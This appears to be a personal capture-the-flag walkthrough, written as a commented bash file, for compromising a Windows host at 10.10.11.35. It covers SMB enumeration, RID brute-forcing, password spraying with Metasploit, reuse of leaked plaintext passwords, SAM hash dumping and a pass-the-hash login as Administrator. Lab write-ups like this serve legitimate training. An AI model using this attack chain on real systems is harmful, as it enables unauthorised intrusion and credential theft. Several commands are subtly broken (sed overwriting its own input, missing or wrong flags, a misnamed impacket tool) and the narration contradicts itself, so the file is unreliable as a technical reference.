#!/usr/bin/env bash

# after scan for open ports with nmap
# found smb 445 port

# connect to smb server with smbclient looking for shares 
# smbclient -L \\10.10.11.35/

# connect to the only accessible share HR
# smbclient \\\\10.10.11.35\\HR

# after list files we find a file named Notice from HR and download it
# smb: \> get "Notice from HR.txt"

# enumerate users with netexec and extract valid users to users.txt
# netexec smb 10.10.11.35 -u guest -p='' --rid-brute | grep "SidTypeUser" > users.txt

# clean the users.txt
# sed -E 's/.*\\([^ ]+).*/\1/' users.txt > users.txt

# tried to find correct combination of username and password by doing password spraying with metasploid and smb_login
# msfconsole 
# use smb_login

#[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_login) >>set rhost 10.10.11.35
#[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_login) >>set smbpass Cicada$M6Corpb*@Lp#nZp!8
#[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_login) >>set user_file ./users.txt
#[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_login) >>run

# found the correct username and password combination on
#[+] 10.10.11.35:445       - 10.10.11.35:445 - Success: '.\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8'

# got no access but new user and pass doing
# netexec smb 10.10.11.35 u='michael.wrightson' p='Cicada$M6Corpb*@Lp#nZp!8' --users --rid-brute

# access with new user and pass
# smbclient \\\\10.10.11.35\\DEV -U david.orelious

# got no access with new user and pass
# get "Backup_script.ps1"

# after try access with the new credentials
# smbclient \\\\10.10.11.35\\C$ -U emily.oscars
# pass: Q!3@Lp#M6b*7t*Vt

# found user flag
# cd \Users\emily.oscars.CICADA\Desktop
# get "user_flag.txt"

# got access with the new credentials
# smbclient \\\\10.10.11.35\\C$ -U emily.oscars
# pass: Q!3@Lp#M6b*7t*Vt

# elevate privileges
# access with Evil-WinRM
# evil-winrm -i 10.10.11.35 -U emily.oscars -P Q!3@Lp#M6b*7t*Vt
# after searching for the flag found some files sam and system in temp Directory.
# download the sam and system files from temp directory
 
# extract hashes with impacket-secretdump from sam and system files
# impacket-secretdump -sam sam -system system -hashes hashes.txt

# init session with Administrator privileges, with evil-winrm
# evil-winrm -i 10.10.11.35 -U Administrator -H 2b87e7c93a3e8a0ea4a581937016f341

# get the flag
# *Evil-WinRM* PS C:\Users\Administrator\Desktop> download root.txt
